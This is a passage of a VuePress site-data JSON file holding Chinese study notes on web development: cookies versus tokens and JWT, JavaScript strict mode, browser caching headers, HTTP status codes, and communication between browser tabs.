      "path": "/webstudy/HTTP/token%E5%92%8Ccookie.html",
      "headers": [
        {
          "level": 2,
          "title": "cookie",
          "slug": "cookie",
          "normalizedTitle": "cookie",
          "charIndex": 8
        },
        {
          "level": 3,
          "title": "cookie跨域限制",
          "slug": "cookie跨域限制",
          "normalizedTitle": "cookie跨域限制",
          "charIndex": 212
        },
        {
          "level": 3,
          "title": "浏览器禁用第三方 cookie",
          "slug": "浏览器禁用第三方-cookie",
          "normalizedTitle": "浏览器禁用第三方 cookie",
          "charIndex": 473
        },
        {
          "level": 3,
          "title": "cookie+session登录",
          "slug": "cookie-session登录",
          "normalizedTitle": "cookie+session登录",
          "charIndex": 691
        },
        {
          "level": 2,
          "title": "token认证",
          "slug": "token认证",
          "normalizedTitle": "token认证",
          "charIndex": 1007
        },
        {
          "level": 3,
          "title": "token+localstorage登录",
          "slug": "token-localstorage登录",
          "normalizedTitle": "token+localstorage登录",
          "charIndex": 1131
        },
        {
          "level": 2,
          "title": "cookie和token区别",
          "slug": "cookie和token区别",
          "normalizedTitle": "cookie和token区别",
          "charIndex": 1545
        },
        {
          "level": 2,
          "title": "session和JWT哪个更优",
          "slug": "session和jwt哪个更优",
          "normalizedTitle": "session和jwt哪个更优",
          "charIndex": 1728
        }
      ],
      "headersStr": "cookie cookie跨域限制 浏览器禁用第三方 cookie cookie+session登录 token认证 token+localstorage登录 cookie和token区别 session和JWT哪个更优",
      "content": "# token和cookie\n\n\n# cookie\n\nhttp 请求是无状态的，即每次请求之后都会断开链接。\n所以，\n引入cookie，客户端向同一个域名下发送请求，会携带相同的 cookie，服务器拿到 cookie 进行解析，便能拿到客户端的状态。而服务端可以通过响应头中的Set-Cookie字段来对客户端写入Cookie\n由于每次请求都携带 cookie ，所以 cookie 大小限制 4kb 以内。\n\n\n\n\n# cookie跨域限制\n\n浏览器存储 cookie 是按照域名区分的，在浏览器无法通过 JS document.cookie 获取到其他域名的 cookie\n\n# 解决cookie跨域\n\nhttp 请求传递 cookie 默认有跨域限制。如果想要开启，需要客户端和服务器同时设置允许\n\n * 客户端：使用 fetch 和 XMLHttpRequest 或者 axios 需要配置 withCredentials\n * 服务端：需要配置 header Access-Control-Allow-Credentials\n\n\n# 浏览器禁用第三方 cookie\n\n现代浏览器都开始禁用第三方 cookie （第三方 js 设置 cookie），打击第三方广告，保护用户个人隐私。\n\n例如一个电商网站 A 引用了淘宝广告的 js\n\n * 你访问 A 时，淘宝 js 设置 cookie ，记录下商品信息\n * 你再次访问淘宝时，淘宝即可获取这个 cookie 内容\n * 再和你的个人信息（也在 cookie 里）一起发送到服务端，这样就知道了你看了哪个商品\n\n\n# cookie+session登录\n\n使用 cookie 做登录校验\n\n * 前端输入用户名密码，传给后端\n * 后端验证成功，返回信息给客户端信息时set-cookie，cookie里面有唯一标识该用户的sessionID\n * 接下来所有接口访问，都自动带上 cookie（浏览器的默认行为， http 协议的规定),在服务器验证信息\n\n# 什么是 session ？\n\n * cookie 只存储 userId ，不去暴露用户信息\n * 用户信息存储在 session 中\n * session 就是服务端的一个 hash 表\n * 存储session 就要需要考虑吧内存的问题（基于Redis 存储 Session）\n\n\n# token认证\n\n * cookie是http 协议规范的，而 token 是自定义的，可以用任何方式传输（如 header body query-string 等）\n * token 默认不会在浏览器存储\n * token 没有跨域限制\n\n\n# token+localstorage登录\n\n * 用户登录，后端验证成功，token值到redis，并且返回给客户端token\n * token一般是一串随机的字符(比如UUID)，value一般是用户ID，并且设置一个过期时间\n * token可以存在localstorage或者vuex中\n * 每次请求服务的时候带上token在请求头，\n * 后端接收到token则根据token查一下redis是否存在，\n * 如果存在则表示用户已认证，\n * 如果token不存在则跳到登录界面让用户重新登录，登录成功后返回一个token值给客户端\n\n# JWT(JSON Web Token)\n\n * 前端输入用户名密码，传给后端\n * 后端验证成功，返回一段 token 字符串 - 将用户信息加密之后得到的\n * 前端获取 token 之后，存储下来\n * 以后访问接口，都在 header 中带上这段 token\n\n\n\n\n# cookie和token区别\n\n * cookie 是 http 规范，而 token 是自定义传递；\n * cookie 会默认被浏览器存储，而 token 需要自己存储；\n * cookie 默认有跨域限制，token 默认没有跨域限制；\n * cookie 一般配合 session 使用，token 一般用于 jwt（json web token）\n\n\n# session和JWT哪个更优\n\nSession 优点\n\n * 原理简单，易于学习\n * 用户信息存储在服务端，可以快速封禁某个登录的用户 —— 有这方强需求的人，一定选择 Session\n\nSession 缺点\n\n * 占用服务端内存，有硬件成本\n * 多进程、多服务器时，不好同步 —— 一般使用第三方 redis 存储 ，成本高\n * 跨域传递 cookie ，需要特殊配置\n\nJWT 的优点\n\n * 不占用服务器内存\n * 多进程、多服务器，不受影响\n * 不受跨域限制\n\nJWT 的缺点\n\n * 无法快速封禁登录的用户\n * token 体积一般大于 cookie，会增加请求的数据量\n\n总结：如果没有“快速封禁登录用户”的需求，建议使用 JWT 方式。",
      "normalizedContent": "# token和cookie\n\n\n# cookie\n\nhttp 请求是无状态的，即每次请求之后都会断开链接。\n所以，\n引入cookie，客户端向同一个域名下发送请求，会携带相同的 cookie，服务器拿到 cookie 进行解析，便能拿到客户端的状态。而服务端可以通过响应头中的set-cookie字段来对客户端写入cookie\n由于每次请求都携带 cookie ，所以 cookie 大小限制 4kb 以内。\n\n\n\n\n# cookie跨域限制\n\n浏览器存储 cookie 是按照域名区分的，在浏览器无法通过 js document.cookie 获取到其他域名的 cookie\n\n# 解决cookie跨域\n\nhttp 请求传递 cookie 默认有跨域限制。如果想要开启，需要客户端和服务器同时设置允许\n\n * 客户端：使用 fetch 和 xmlhttprequest 或者 axios 需要配置 withcredentials\n * 服务端：需要配置 header access-control-allow-credentials\n\n\n# 浏览器禁用第三方 cookie\n\n现代浏览器都开始禁用第三方 cookie （第三方 js 设置 cookie），打击第三方广告，保护用户个人隐私。\n\n例如一个电商网站 a 引用了淘宝广告的 js\n\n * 你访问 a 时，淘宝 js 设置 cookie ，记录下商品信息\n * 你再次访问淘宝时，淘宝即可获取这个 cookie 内容\n * 再和你的个人信息（也在 cookie 里）一起发送到服务端，这样就知道了你看了哪个商品\n\n\n# cookie+session登录\n\n使用 cookie 做登录校验\n\n * 前端输入用户名密码，传给后端\n * 后端验证成功，返回信息给客户端信息时set-cookie，cookie里面有唯一标识该用户的sessionid\n * 接下来所有接口访问，都自动带上 cookie（浏览器的默认行为， http 协议的规定),在服务器验证信息\n\n# 什么是 session ？\n\n * cookie 只存储 userid ，不去暴露用户信息\n * 用户信息存储在 session 中\n * session 就是服务端的一个 hash 表\n * 存储session 就要需要考虑吧内存的问题（基于redis 存储 session）\n\n\n# token认证\n\n * cookie是http 协议规范的，而 token 是自定义的，可以用任何方式传输（如 header body query-string 等）\n * token 默认不会在浏览器存储\n * token 没有跨域限制\n\n\n# token+localstorage登录\n\n * 用户登录，后端验证成功，token值到redis，并且返回给客户端token\n * token一般是一串随机的字符(比如uuid)，value一般是用户id，并且设置一个过期时间\n * token可以存在localstorage或者vuex中\n * 每次请求服务的时候带上token在请求头，\n * 后端接收到token则根据token查一下redis是否存在，\n * 如果存在则表示用户已认证，\n * 如果token不存在则跳到登录界面让用户重新登录，登录成功后返回一个token值给客户端\n\n# jwt(json web token)\n\n * 前端输入用户名密码，传给后端\n * 后端验证成功，返回一段 token 字符串 - 将用户信息加密之后得到的\n * 前端获取 token 之后，存储下来\n * 以后访问接口，都在 header 中带上这段 token\n\n\n\n\n# cookie和token区别\n\n * cookie 是 http 规范，而 token 是自定义传递；\n * cookie 会默认被浏览器存储，而 token 需要自己存储；\n * cookie 默认有跨域限制，token 默认没有跨域限制；\n * cookie 一般配合 session 使用，token 一般用于 jwt（json web token）\n\n\n# session和jwt哪个更优\n\nsession 优点\n\n * 原理简单，易于学习\n * 用户信息存储在服务端，可以快速封禁某个登录的用户 —— 有这方强需求的人，一定选择 session\n\nsession 缺点\n\n * 占用服务端内存，有硬件成本\n * 多进程、多服务器时，不好同步 —— 一般使用第三方 redis 存储 ，成本高\n * 跨域传递 cookie ，需要特殊配置\n\njwt 的优点\n\n * 不占用服务器内存\n * 多进程、多服务器，不受影响\n * 不受跨域限制\n\njwt 的缺点\n\n * 无法快速封禁登录的用户\n * token 体积一般大于 cookie，会增加请求的数据量\n\n总结：如果没有“快速封禁登录用户”的需求，建议使用 jwt 方式。",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "JS严格模式",
      "frontmatter": {
        "title": "JS严格模式"
      },
      "regularPath": "/webstudy/Javascript/JS%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F.html",
      "relativePath": "webstudy/Javascript/JS严格模式.md",
      "key": "v-6fa45728",
      "path": "/webstudy/Javascript/JS%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F.html",
      "headers": [
        {
          "level": 2,
          "title": "严格模式和非严格模式的区别",
          "slug": "严格模式和非严格模式的区别",
          "normalizedTitle": "严格模式和非严格模式的区别",
          "charIndex": 14
        },
        {
          "level": 2,
          "title": "设计初衷",
          "slug": "设计初衷",
          "normalizedTitle": "设计初衷",
          "charIndex": 104
        },
        {
          "level": 2,
          "title": "开启严格模式",
          "slug": "开启严格模式",
          "normalizedTitle": "开启严格模式",
          "charIndex": 181
        },
        {
          "level": 2,
          "title": "严格模式的不同",
          "slug": "严格模式的不同",
          "normalizedTitle": "严格模式的不同",
          "charIndex": 350
        },
        {
          "level": 3,
          "title": "全局变量必须声明",
          "slug": "全局变量必须声明",
          "normalizedTitle": "全局变量必须声明",
          "charIndex": 32
        },
        {
          "level": 3,
          "title": "禁止使用 with",
          "slug": "禁止使用-with",
          "normalizedTitle": "禁止使用 with",
          "charIndex": 44
        },
        {
          "level": 3,
          "title": "创建 eval 作用域",
          "slug": "创建-eval-作用域",
          "normalizedTitle": "创建 eval 作用域",
          "charIndex": 57
        },
        {
          "level": 3,
          "title": "禁止 this 指向全局作用域",
          "slug": "禁止-this-指向全局作用域",
          "normalizedTitle": "禁止 this 指向全局作用域",
          "charIndex": 72
        },
        {
          "level": 3,
          "title": "函数参数不能重名",
          "slug": "函数参数不能重名",
          "normalizedTitle": "函数参数不能重名",
          "charIndex": 91
        }
      ],
      "headersStr": "严格模式和非严格模式的区别 设计初衷 开启严格模式 严格模式的不同 全局变量必须声明 禁止使用 with 创建 eval 作用域 禁止 this 指向全局作用域 函数参数不能重名",
      "content": "# JS 严格模式\n\n\n# 严格模式和非严格模式的区别\n\n * 全局变量必须声明\n * 禁止使用 with\n * 创建 eval 作用域\n * 禁止 this 指向全局作用域\n * 函数参数不能重名\n\n\n# 设计初衷\n\nJavascript 设计之初，有很多不合理、不严谨、不安全之处，例如变量未定义即可使用 n = 100。严格模式用于规避这些问题。\n\n\n# 开启严格模式\n\n代码（或一个函数）一开始插入一行 'use strict' 即可开启严格模式\n\n'use strict' // 全局开启\n\nfunction fn() {\n    'use strict' // 某个函数开启\n\n}\n\n\n一般情况下，开发环境用 ES 或者 Typescript ，打包出的 js 代码使用严格模式\n\n\n# 严格模式的不同\n\n严格模式的细则有很多，这里总结一些常用常见的\n\n\n# 全局变量必须声明\n\n'use strict'\nn = 10 // ReferenceError: n is not defined\n\n\n\n# 禁止使用 with\n\n'use strict'\nvar obj = { x: 10 }\nwith (obj) {\n    // Uncaught SyntaxError: Strict mode code may not include a with statement\n    console.log(x)\n}\n\n\n\n# 创建 eval 作用域\n\n正常模式下，JS 只有两种变量作用域：全局作用域 + 函数作用域。严格模式下，JS 增加了 eval 作用域。\n\nchrome 隐私模式下执行这段代码？？？\n\n'use strict'\nvar x = 10\neval('var x = 20; console.log(x)')\nconsole.log(x)\n\n\n\n# 禁止 this 指向全局作用域\n\n'use strict'\nfunction fn() {\n    console.log('this', this) // undefined\n}\nfn()\n\n\n\n# 函数参数不能重名\n\n'use strict'\n\n// Uncaught SyntaxError: Duplicate parameter name not allowed in this context\nfunction fn(x, x, y) {\n    return\n}\n",
      "normalizedContent": "# js 严格模式\n\n\n# 严格模式和非严格模式的区别\n\n * 全局变量必须声明\n * 禁止使用 with\n * 创建 eval 作用域\n * 禁止 this 指向全局作用域\n * 函数参数不能重名\n\n\n# 设计初衷\n\njavascript 设计之初，有很多不合理、不严谨、不安全之处，例如变量未定义即可使用 n = 100。严格模式用于规避这些问题。\n\n\n# 开启严格模式\n\n代码（或一个函数）一开始插入一行 'use strict' 即可开启严格模式\n\n'use strict' // 全局开启\n\nfunction fn() {\n    'use strict' // 某个函数开启\n\n}\n\n\n一般情况下，开发环境用 es 或者 typescript ，打包出的 js 代码使用严格模式\n\n\n# 严格模式的不同\n\n严格模式的细则有很多，这里总结一些常用常见的\n\n\n# 全局变量必须声明\n\n'use strict'\nn = 10 // referenceerror: n is not defined\n\n\n\n# 禁止使用 with\n\n'use strict'\nvar obj = { x: 10 }\nwith (obj) {\n    // uncaught syntaxerror: strict mode code may not include a with statement\n    console.log(x)\n}\n\n\n\n# 创建 eval 作用域\n\n正常模式下，js 只有两种变量作用域：全局作用域 + 函数作用域。严格模式下，js 增加了 eval 作用域。\n\nchrome 隐私模式下执行这段代码？？？\n\n'use strict'\nvar x = 10\neval('var x = 20; console.log(x)')\nconsole.log(x)\n\n\n\n# 禁止 this 指向全局作用域\n\n'use strict'\nfunction fn() {\n    console.log('this', this) // undefined\n}\nfn()\n\n\n\n# 函数参数不能重名\n\n'use strict'\n\n// uncaught syntaxerror: duplicate parameter name not allowed in this context\nfunction fn(x, x, y) {\n    return\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "浏览器的缓存机制",
      "frontmatter": {
        "title": "浏览器的缓存机制"
      },
      "regularPath": "/webstudy/HTTP/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6.html",
      "relativePath": "webstudy/HTTP/浏览器的缓存机制.md",
      "key": "v-9b6bab4e",
      "path": "/webstudy/HTTP/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6.html",
      "headers": [
        {
          "level": 2,
          "title": "协商缓存和强缓存",
          "slug": "协商缓存和强缓存",
          "normalizedTitle": "协商缓存和强缓存",
          "charIndex": 15
        },
        {
          "level": 3,
          "title": "强缓存",
          "slug": "强缓存",
          "normalizedTitle": "强缓存",
          "charIndex": 20
        },
        {
          "level": 3,
          "title": "协商缓存",
          "slug": "协商缓存",
          "normalizedTitle": "协商缓存",
          "charIndex": 15
        }
      ],
      "headersStr": "协商缓存和强缓存 强缓存 协商缓存",
      "content": "# 浏览器的缓存机制\n\n\n# 协商缓存和强缓存\n\n\n# 强缓存\n\n浏览器中的缓存作用分为两种情况，一种是需要发送HTTP请求，一种是不需要发送。\n\n首先检查强缓存，这个阶段不需要发送HTTP请求\n\n通过请求头中相应的字段来进行检查，在HTTP/1.0和HTTP/1.1当中，这个字段是不一样的。\n\n * HTTP/1.0时期，使用的是Expires，\n * HTTP/1.1使用的是Cache-Control。\n\n# Expires\n\nExpires即过期时间。存在于服务端返回的响应头中，告诉浏览器在这个过期时间之前可以直接从缓存里面获取数据，无需再次请求。\n\nExpires: Wed, 22 Nov 2019 08:41:00 GMT\n\n\n这里会有一个问题，那就是服务器的时间和浏览器的时间可能并不一致，那服务器返回的这个过期时间可能就是不准确的。因此这种方式很快在后来的HTTP1.1版本中被抛弃了....\n引入Cache-Control\n\n# Cache-Control\n\n和Expires本质的不同在于它并没有采用具体的过期时间点这个方式，而是采用过期时长来控制缓存，对应的字段是max-age\n\nCache-Control:max-age=360 \n//代表这个响应返回后在 3600 秒，也就是一个小时之内可以直接使用缓存\n\n\n其他的属性\n\n * public：客户端和代理服务器都可以缓存。因为一个请求可能要经过不同的代理服务器最后才到达目标服务器，那么结果就是不仅仅浏览器可以缓存数据，中间的任何代理节点都可以进行缓存。\n * private：这种情况就是只有浏览器能缓存了，中间的代理服务器不能缓存。\n * no-cache：跳过当前的强缓存，发送HTTP请求，即直接进入协商缓存阶段。\n * no-atore：非常粗暴，不进行任何形式的缓存。\n * s-maxage：这和max-age长得比较像，但是区别在于s-maxage是针对代理服务器的缓存时间。值得注意的是，当Expires和Cache-Control同时存在的时候，Cache-Control会优先考虑。\n\n还存在一种情况，当资源缓存时间超时了，也就是强缓存失效了，接下来怎么办？\n引入协商缓存\n\n\n# 协商缓存\n\n强缓存失效之后，浏览器在请求头中携带相应的缓存tag来向服务器发请求，由服务器根据这个tag，决定是否使用缓存，这就是协商缓存\n\n * Last-Modified\n * ETag\n\n# Last-Modified（最后修改时间）\n\n1、在浏览器第一次给服务器发送请求后，服务器会在响应头中加上这个字段。\n\n2、浏览器接收到后，如果再次请求，会在请求头中携带If-Modified-Since字段，这个字段的值也就是服务器传来的最后修改时间。\n\n3、服务器拿到请求头中的If-Modified-Since的字段后，其实会和这个服务器中该资源的最后修改时间对比:\n\n4、如果请求头中的这个值小于最后修改时间，说明是时候更新了。返回新的资源，跟常规的HTTP请求响应的流程一样。\n\n5、否则返回304，告诉浏览器直接用缓存。\n\n# ETag\n\n1、ETag 是服务器根据当前文件的内容，给文件生成的唯一标识，只要里面的内容有改动，这个值就会变。服务器通过响应头把这个值给浏览器。\n\n2、浏览器接收到ETag的值，会在下次请求时，将这个值作为If-None-Match这个字段的内容，并放到请求头中，然后发给服务器。\n\n3、服务器接收到If-None-Match后，会跟服务器上该资源的ETag进行比对:\n\n4、如果两者不一样，说明要更新了。返回新的资源，跟常规的HTTP请求响应的流程一样。否则返回304，告诉浏览器直接用缓存。",
      "normalizedContent": "# 浏览器的缓存机制\n\n\n# 协商缓存和强缓存\n\n\n# 强缓存\n\n浏览器中的缓存作用分为两种情况，一种是需要发送http请求，一种是不需要发送。\n\n首先检查强缓存，这个阶段不需要发送http请求\n\n通过请求头中相应的字段来进行检查，在http/1.0和http/1.1当中，这个字段是不一样的。\n\n * http/1.0时期，使用的是expires，\n * http/1.1使用的是cache-control。\n\n# expires\n\nexpires即过期时间。存在于服务端返回的响应头中，告诉浏览器在这个过期时间之前可以直接从缓存里面获取数据，无需再次请求。\n\nexpires: wed, 22 nov 2019 08:41:00 gmt\n\n\n这里会有一个问题，那就是服务器的时间和浏览器的时间可能并不一致，那服务器返回的这个过期时间可能就是不准确的。因此这种方式很快在后来的http1.1版本中被抛弃了....\n引入cache-control\n\n# cache-control\n\n和expires本质的不同在于它并没有采用具体的过期时间点这个方式，而是采用过期时长来控制缓存，对应的字段是max-age\n\ncache-control:max-age=360 \n//代表这个响应返回后在 3600 秒，也就是一个小时之内可以直接使用缓存\n\n\n其他的属性\n\n * public：客户端和代理服务器都可以缓存。因为一个请求可能要经过不同的代理服务器最后才到达目标服务器，那么结果就是不仅仅浏览器可以缓存数据，中间的任何代理节点都可以进行缓存。\n * private：这种情况就是只有浏览器能缓存了，中间的代理服务器不能缓存。\n * no-cache：跳过当前的强缓存，发送http请求，即直接进入协商缓存阶段。\n * no-atore：非常粗暴，不进行任何形式的缓存。\n * s-maxage：这和max-age长得比较像，但是区别在于s-maxage是针对代理服务器的缓存时间。值得注意的是，当expires和cache-control同时存在的时候，cache-control会优先考虑。\n\n还存在一种情况，当资源缓存时间超时了，也就是强缓存失效了，接下来怎么办？\n引入协商缓存\n\n\n# 协商缓存\n\n强缓存失效之后，浏览器在请求头中携带相应的缓存tag来向服务器发请求，由服务器根据这个tag，决定是否使用缓存，这就是协商缓存\n\n * last-modified\n * etag\n\n# last-modified（最后修改时间）\n\n1、在浏览器第一次给服务器发送请求后，服务器会在响应头中加上这个字段。\n\n2、浏览器接收到后，如果再次请求，会在请求头中携带if-modified-since字段，这个字段的值也就是服务器传来的最后修改时间。\n\n3、服务器拿到请求头中的if-modified-since的字段后，其实会和这个服务器中该资源的最后修改时间对比:\n\n4、如果请求头中的这个值小于最后修改时间，说明是时候更新了。返回新的资源，跟常规的http请求响应的流程一样。\n\n5、否则返回304，告诉浏览器直接用缓存。\n\n# etag\n\n1、etag 是服务器根据当前文件的内容，给文件生成的唯一标识，只要里面的内容有改动，这个值就会变。服务器通过响应头把这个值给浏览器。\n\n2、浏览器接收到etag的值，会在下次请求时，将这个值作为if-none-match这个字段的内容，并放到请求头中，然后发给服务器。\n\n3、服务器接收到if-none-match后，会跟服务器上该资源的etag进行比对:\n\n4、如果两者不一样，说明要更新了。返回新的资源，跟常规的http请求响应的流程一样。否则返回304，告诉浏览器直接用缓存。",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "状态码",
      "frontmatter": {
        "title": "状态码"
      },
      "regularPath": "/webstudy/HTTP/%E7%8A%B6%E6%80%81%E7%A0%81.html",
      "relativePath": "webstudy/HTTP/状态码.md",
      "key": "v-42916c76",
      "path": "/webstudy/HTTP/%E7%8A%B6%E6%80%81%E7%A0%81.html",
      "headers": [
        {
          "level": 3,
          "title": "2XX(Success 成功状态码)",
          "slug": "_2xx-success-成功状态码",
          "normalizedTitle": "2xx(success 成功状态码)",
          "charIndex": 10
        },
        {
          "level": 3,
          "title": "3XX(Redirection 重定向状态码)",
          "slug": "_3xx-redirection-重定向状态码",
          "normalizedTitle": "3xx(redirection 重定向状态码)",
          "charIndex": 118
        },
        {
          "level": 3,
          "title": "4XX(Client Error 客户端错误状态码)",
          "slug": "_4xx-client-error-客户端错误状态码",
          "normalizedTitle": "4xx(client error 客户端错误状态码)",
          "charIndex": 385
        },
        {
          "level": 3,
          "title": "5XX(Server Error 服务器错误状态码)",
          "slug": "_5xx-server-error-服务器错误状态码",
          "normalizedTitle": "5xx(server error 服务器错误状态码)",
          "charIndex": 742
        }
      ],
      "headersStr": "2XX(Success 成功状态码) 3XX(Redirection 重定向状态码) 4XX(Client Error 客户端错误状态码) 5XX(Server Error 服务器错误状态码)",
      "content": "# 状态码\n\n\n# 2XX(Success 成功状态码)\n\n * 200 OK 表明请求已经成功. 默认情况下状态码为200的响应可以被缓存。\n * 204 No Content 表示目前请求成功，但客户端不需要更新其现有页面\n\n\n# 3XX(Redirection 重定向状态码)\n\n * 301 Moved Permanently 永久重定向。说明请求的资源已经被移动到了由 Location 头部指定的 url 上，是固定的不会再改变。搜索引擎会根据该响应修正。\n * 302 Found 临时重定向。重定向状态码表明请求的资源被暂时的移动到了由 Location 头部指定的 URL 上。浏览器会重定向到这个URL，但是搜索引擎不会对该资源的链接进行更新\n * 304 Not Modified 说明无需再次传输请求的内容，也就是说可以使用缓存的内容。\n\n\n# 4XX(Client Error 客户端错误状态码)\n\n * 401 Unauthorized 说明由于缺乏目标资源要求的身份验证凭证，发送的请求未得到满足。\n * 403 Forbidden 指的是服务器端有能力处理该请求，但是拒绝授权访问。进入该状态后，不能再继续进行验证。该访问是永久禁止的，并且与应用逻辑密切相关（例如不正确的密码）\n * 404 Not Found 说明服务器端无法找到所请求的资源。返回该响应的链接通常称为坏链（broken link）或死链（dead link），它们会导向链接出错处理\n * 405 Method Not Allowed 表明服务器禁止了使用当前 HTTP 方法的请求。需要注意的是，GET 与 HEAD 两个方法不得被禁止，当然也不得返回状态码 405。\n\n\n# 5XX(Server Error 服务器错误状态码)\n\n * 500 Internal Server Error 表示所请求的服务器遇到意外的情况并阻止其执行请求。\n * 502 Bad Gateway 表示作为网关或代理角色的服务器，从上游服务器（如tomcat、php-fpm）中接收到的响应是无效的。\n * 503 Service Unavailable 表示服务器尚未处于可以接受请求的状态。通常造成这种情况的原因是由于服务器停机维护或者已超载。",
      "normalizedContent": "# 状态码\n\n\n# 2xx(success 成功状态码)\n\n * 200 ok 表明请求已经成功. 默认情况下状态码为200的响应可以被缓存。\n * 204 no content 表示目前请求成功，但客户端不需要更新其现有页面\n\n\n# 3xx(redirection 重定向状态码)\n\n * 301 moved permanently 永久重定向。说明请求的资源已经被移动到了由 location 头部指定的 url 上，是固定的不会再改变。搜索引擎会根据该响应修正。\n * 302 found 临时重定向。重定向状态码表明请求的资源被暂时的移动到了由 location 头部指定的 url 上。浏览器会重定向到这个url，但是搜索引擎不会对该资源的链接进行更新\n * 304 not modified 说明无需再次传输请求的内容，也就是说可以使用缓存的内容。\n\n\n# 4xx(client error 客户端错误状态码)\n\n * 401 unauthorized 说明由于缺乏目标资源要求的身份验证凭证，发送的请求未得到满足。\n * 403 forbidden 指的是服务器端有能力处理该请求，但是拒绝授权访问。进入该状态后，不能再继续进行验证。该访问是永久禁止的，并且与应用逻辑密切相关（例如不正确的密码）\n * 404 not found 说明服务器端无法找到所请求的资源。返回该响应的链接通常称为坏链（broken link）或死链（dead link），它们会导向链接出错处理\n * 405 method not allowed 表明服务器禁止了使用当前 http 方法的请求。需要注意的是，get 与 head 两个方法不得被禁止，当然也不得返回状态码 405。\n\n\n# 5xx(server error 服务器错误状态码)\n\n * 500 internal server error 表示所请求的服务器遇到意外的情况并阻止其执行请求。\n * 502 bad gateway 表示作为网关或代理角色的服务器，从上游服务器（如tomcat、php-fpm）中接收到的响应是无效的。\n * 503 service unavailable 表示服务器尚未处于可以接受请求的状态。通常造成这种情况的原因是由于服务器停机维护或者已超载。",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "网页多标签通讯",
      "frontmatter": {
        "title": "网页多标签通讯"
      },
      "regularPath": "/webstudy/HTTP/%E7%BD%91%E9%A1%B5%E5%A4%9A%E6%A0%87%E7%AD%BE%E9%80%9A%E8%AE%AF.html",
      "relativePath": "webstudy/HTTP/网页多标签通讯.md",
      "key": "v-64357012",
      "path": "/webstudy/HTTP/%E7%BD%91%E9%A1%B5%E5%A4%9A%E6%A0%87%E7%AD%BE%E9%80%9A%E8%AE%AF.html",
      "headers": [
        {
          "level": 2,
          "title": "localstorage",
          "slug": "localstorage",
          "normalizedTitle": "localstorage",
          "charIndex": 14
        },
        {
          "level": 2,
          "title": "webSocket",
          "slug": "websocket",
          "normalizedTitle": "websocket",
          "charIndex": 448
        },
        {
          "level": 2,
          "title": "SharedWorker",
          "slug": "sharedworker",
          "normalizedTitle": "sharedworker",
          "charIndex": 489
        },
        {
          "level": 2,
          "title": "iframe",
          "slug": "iframe",
          "normalizedTitle": "iframe",
          "charIndex": 512
        }
      ],
      "headersStr": "localstorage webSocket SharedWorker iframe",
      "content": "# 网页多标签通讯\n\n\n# localstorage\n\n * 必须是同域的 n 个页面\n * 如过数据不变化，则监听不到\n\n<script>\n  //A页面\n  const btn = document.getElementById(\"btn\");\n  btn.addEventListener(\"click\", () => {\n    const info = {\n      name: \"yang\",\n      age: 18,\n    };\n    localStorage.setItem(\"info\", JSON.stringify(info));\n  });\n  //B页面\n  window.addEventListener('storage', (event) => {\n    console.log('event :>> ', event.key);\n    console.log('object :>> ', object);\n  })\n</script>\n\n\n\n# webSocket\n\n通过 webSocket 多页面通讯，无跨域限制。\n\n\n# SharedWorker\n\n暂未了解\n\n\n# iframe\n\nwindow.postMessage\n\n// 父页面向 iframe 发送消息\n// 第二个参数可以限制域名，\nwindow.iframe1.contentWindow.postMessage('hello', '*')\n\n// iframe 向父页面发送消息\nwindow.parent.postMessage('world', '*')\n\n\n> event.origin，监听域名是否合法\n\nwindow.addEventListener(\"message\", receiveMessage, false);\n\nfunction receiveMessage(event)\n{\n  // For Chrome, the origin property is in the event.originalEvent\n  // object.\n  // 这里不准确，chrome 没有这个属性\n  // var origin = event.origin || event.originalEvent.origin;\n  var origin = event.origin\n  if (origin !== \"http://example.org:8080\")\n    return;\n\n  // ...\n}\n\n\n",
      "normalizedContent": "# 网页多标签通讯\n\n\n# localstorage\n\n * 必须是同域的 n 个页面\n * 如过数据不变化，则监听不到\n\n<script>\n  //a页面\n  const btn = document.getelementbyid(\"btn\");\n  btn.addeventlistener(\"click\", () => {\n    const info = {\n      name: \"yang\",\n      age: 18,\n    };\n    localstorage.setitem(\"info\", json.stringify(info));\n  });\n  //b页面\n  window.addeventlistener('storage', (event) => {\n    console.log('event :>> ', event.key);\n    console.log('object :>> ', object);\n  })\n</script>\n\n\n\n# websocket\n\n通过 websocket 多页面通讯，无跨域限制。\n\n\n# sharedworker\n\n暂未了解\n\n\n# iframe\n\nwindow.postmessage\n\n// 父页面向 iframe 发送消息\n// 第二个参数可以限制域名，\nwindow.iframe1.contentwindow.postmessage('hello', '*')\n\n// iframe 向父页面发送消息\nwindow.parent.postmessage('world', '*')\n\n\n> event.origin，监听域名是否合法\n\nwindow.addeventlistener(\"message\", receivemessage, false);\n\nfunction receivemessage(event)\n{\n  // for chrome, the origin property is in the event.originalevent\n  // object.\n  // 这里不准确，chrome 没有这个属性\n  // var origin = event.origin || event.originalevent.origin;\n  var origin = event.origin\n  if (origin !== \"http://example.org:8080\")\n    return;\n\n  // ...\n}\n\n\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "内存泄露和垃圾回收",
      "frontmatter": {
        "title": "内存泄露和垃圾回收"
      },
      "regularPath": "/webstudy/Javascript/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E5%92%8C%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6.html",
      "relativePath": "webstudy/Javascript/内存泄漏和垃圾回收.md",
      "key": "v-741233c4",
      "path": "/webstudy/Javascript/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E5%92%8C%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6.html",
      "headers": [
        {
          "level": 2,
          "title": "内存泄露和垃圾回收",
          "slug": "内存泄露和垃圾回收",
          "normalizedTitle": "内存泄露和垃圾回收",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "内存泄漏",
          "slug": "内存泄漏",
          "normalizedTitle": "内存泄漏",
          "charIndex": 16
        },
        {
          "level": 3,
          "title": "垃圾回收",
          "slug": "垃圾回收",
          "normalizedTitle": "垃圾回收",
          "charIndex": 7
        },
        {
          "level": 3,
          "title": "如何检测Js内存泄漏",
